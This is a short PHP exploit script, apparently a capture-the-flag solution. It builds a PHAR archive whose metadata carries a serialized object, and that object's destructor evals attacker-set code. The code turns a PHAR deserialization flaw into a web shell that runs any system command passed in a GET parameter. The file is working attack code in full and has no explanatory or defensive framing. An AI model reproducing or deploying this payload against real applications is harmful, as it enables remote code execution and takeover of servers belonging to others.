<?php
class Uploader{
    public $Filename;
    public $cmd;
    public $token;
    function __destruct(){
        eval($this->cmd);
    }
}

$o = new Uploader();
$o->cmd = 'if (isset($_GET["cmd"])) echo(system($_GET["cmd"]));';#
$o->token = 'GXYbcff44b7e3eded9c82f11f58aa4c5261';
$phar = new Phar("payload.phar");
$phar ->startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?");
$phar -> setMetadata($o);
$phar -> addFromString("test.txt","you are hacked");
$phar -> stopBuffering();

?>